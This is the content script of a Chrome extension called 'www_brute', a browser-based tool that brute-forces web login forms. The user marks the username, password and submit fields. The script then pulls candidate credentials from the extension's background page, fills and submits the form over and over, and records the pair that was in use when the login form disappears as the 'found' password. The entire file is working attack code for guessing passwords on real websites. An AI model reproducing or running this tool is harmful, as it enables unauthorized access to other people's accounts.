VERSION = '1.20'


function bruteforce_exception(mess)
{
	console.info(mess)
}

function in_frame()
{
	return window.location.href != window.top.location.href
}

var DOM_helper = {
	similar_elements: [],

	search_element: function(where, what)
	{
		for(var i = 0; i < where.children.length; i++)
		{
			var elem = where.children[i], is_found = true, matches = 0
			for(var attr in what)
			{
				if( elem.getAttribute( attr ) == what[attr] )
					matches++
				else
					is_found = false
			}		
			if(is_found && matches)
				break
			
			if(matches)
				this.similar_elements.push( { elem: elem, matches: matches } )
			if( elem = this.search_element(elem, what) )
				return elem
		}
		if(is_found)
			return elem
	},

	similar_element: function(where, what)
	{
		var elem
		elem = this.search_element(where, what)
		if(elem)
			return elem

		var max_matches = 0
		for( var i = 0; i < this.similar_elements.length; i++ )
		{
			if( this.similar_elements[i].matches > max_matches )
			{
				max_matches = this.similar_elements[i].matches
				elem = this.similar_elements[i].elem
			}
		}
		if(elem)
			return elem
	},

	element_to_object: function(element)
	{
		var object = {}
		for( var i = 0; i < element.attributes.length; i++ )
			object[ element.attributes[i].nodeName ] = element.attributes[i].nodeValue
		return object
	}
}


var Brute = function()
{
	var user_field_element, password_field_element, submit_field_element,

	get_field_element = function(field_object)
	{
		return DOM_helper.similar_element( document.body, field_object )
	},

	highlight_field_element = function(field_element, color)
	{
		if( document.body.contains(field_element) )
			field_element.style.backgroundColor = color
	}

	this.user_field
	this.password_field
	this.submit_field
	this.interval = 0
	this.creds = {}
	this.is_running = false
	this.is_setting_done = true

	this.set_creds = function(user,password)
	{
		this.creds.user = user
		this.creds.password = password
	}
	
	this.highlight_inputs = function()
	{
		var _user_field_element = get_field_element(this.user_field),
			_password_field_element = get_field_element(this.password_field),
			_submit_field_element = get_field_element(this.submit_field)
		highlight_field_element( _user_field_element, '#F00' )
		highlight_field_element( _password_field_element, '#F00' )
		highlight_field_element( _submit_field_element, '#F00' )
		setTimeout( function() {
			highlight_field_element( _user_field_element, '' )
			highlight_field_element( _password_field_element, '' )
			highlight_field_element( _submit_field_element, '' )
		}, 1000 )
	}

	this.setting = function()
	{
		if(! this.is_setting_done)
			return

		this.is_setting_done = false
		this.user_field = false
		this.password_field = false
		this.submit_field = false
		window.alert("click on next sequence:\n" + "1) user input\n" + "2) password input\n" + "3) submit button")
		var on_click_handler = ( function(that) { return function(e) {
				//console.log('click')
				if(! that.user_field)
				{
					//console.log('user_field')
					that.user_field = DOM_helper.element_to_object(e.target)
					highlight_field_element(e.target, '#F00')
				}
				else if(! that.password_field)
				{
					//console.log('password_field')
					that.password_field = DOM_helper.element_to_object(e.target)
					highlight_field_element(e.target, '#F00')
				}
				else if(! that.submit_field)
				{
					//console.log('submit_field')
					that.submit_field = DOM_helper.element_to_object(e.target)
					highlight_field_element(e.target, '#F00')
					that.put_settings()
					that.is_setting_done = true
					document.getElementsByTagName('body')[0].removeEventListener('click', on_click_handler)
				}
		} } )(this)
		document.getElementsByTagName('body')[0].addEventListener('click', on_click_handler)
		return this
	}

	this.find_field_elements = function()
	{
		if(! document.body.contains(user_field_element) )
			user_field_element = get_field_element(this.user_field)
		if(! document.body.contains(password_field_element) )
			password_field_element = get_field_element(this.password_field)
		if(! document.body.contains(submit_field_element) )
			submit_field_element = get_field_element(this.submit_field)
		return document.body.contains(submit_field_element)
	}

	this.put_settings = function()
	{
		bg_send_message( { 
			method: 'put_settings', 
			data: { 
				host: location.host,
				setting: { 
					user_field: this.user_field,
					password_field: this.password_field,
					submit_field: this.submit_field 
				}
			}
		} )
		return this
	}

	this.attempt = function()
	{
		function wait_target(that)
		{
			bg_send_message( 
				{ method: 'wait_target', data: { host: location.host } },
				  function(target) {
					if(target)
					{
						that.user_field = target.settings.user_field
						that.password_field = target.settings.password_field
						that.submit_field = target.settings.submit_field
						that.interval = target.settings.brute_interval * 1000
						if( that.password_field && that.submit_field && ! that.find_field_elements() )
						{
							var previously_user = localStorage.getItem('user'),
								previously_password = localStorage.getItem('password')
							bg_send_message( { method: 'put_founded', data: { host: location.host, founded: { user: previously_user, password: previously_password } } } )
							bg_send_message( { method: 'put_status', data: { host: location.host, status: { is_attack: false, is_found: true } } } )
							//alert(previously_user + ":" + previously_password)
							return
						}
						if(! target.status.is_attack && ! target.status.is_found)
						{
							setTimeout(wait_target, 1000, that)
							return
						}
						if(! target.status.is_found)
							//wait_for(password_field_element, that)
							setTimeout( function() { get_creds(that) }, that.interval )

					}
				}
			)
		}
		/*function wait_for(field_object, that)
		{
			if(field_object && field_object.value == '')
				get_creds(that)
			else
				setTimeout( wait_for, 1000, field_object, that )
		}*/
		function get_creds(that)
		{
			bg_send_message( 
				{ method: 'get_creds', data: { host: location.host } },
				  function(creds) {
					if(creds)
					{
						if(creds.user != null && creds.password != null)
							that.set_creds(creds.user, creds.password)
						else
							return
						that.attack()
					}
				}
			)
		}

		if(! this.is_running)
		{
			this.is_running = true
			wait_target(this)
		}
	}

	this.attack = function()
	{
		highlight_field_element(user_field_element, '#F00')
		highlight_field_element(password_field_element, '#F00')
		highlight_field_element(submit_field_element, '#F00')
		if(password_field_element && submit_field_element)
			this.login(user_field_element, password_field_element, submit_field_element)
	}

	this.login = function(user_field_element, password_field_element, submit_field_element)
	{
		localStorage.setItem('user', this.creds.user)
		localStorage.setItem('password', this.creds.password)
		if(user_field_element)
			user_field_element.value = this.creds.user
		password_field_element.value = this.creds.password
		submit_field_element.click()
		
		/* if ajax */
		this.next_attempt = this.attempt
		this.next_attempt()
	}
}


var bruteforce,
	bg_handlers = {
	get_host: function()
	{
		return document.location.host
	},
	select_inputs: function()
	{
		bruteforce.setting()
	},
	highlight_inputs: function()
	{
		bruteforce.highlight_inputs()
	},
	start_brute: function()
	{
		bruteforce.attempt()
	}
}


function bg_recv_message(obj)
{
	//console.log('context bg_recv_message( obj.method=' + obj.method + ' )')
	return bg_handlers[ obj.method ]( obj.data )
}

function bg_send_message(obj, callback)
{
	//console.log('context bg_send_message( obj.method=' + obj.method + ', obj.data=' + JSON.stringify(obj.data) + ' )')
	chrome.runtime.sendMessage( obj, function(response) { if(callback) callback(response) } ) 
}

function page_is_load()
{
	bg_send_message( { method: 'page_ready', data: { host: location.host } } )
}


if( in_frame() )
	throw bruteforce_exception('skipping frame')


chrome.runtime.onMessage.addListener( function(obj, sender, sendResponse) {
	var result = bg_recv_message(obj)
	//console.log('context chrome.runtime.onMessage() -> ' + result)
	sendResponse( result )
} )

page_is_load()
bruteforce = new Brute()
bruteforce.attempt()

console.info('www_brute ' + VERSION)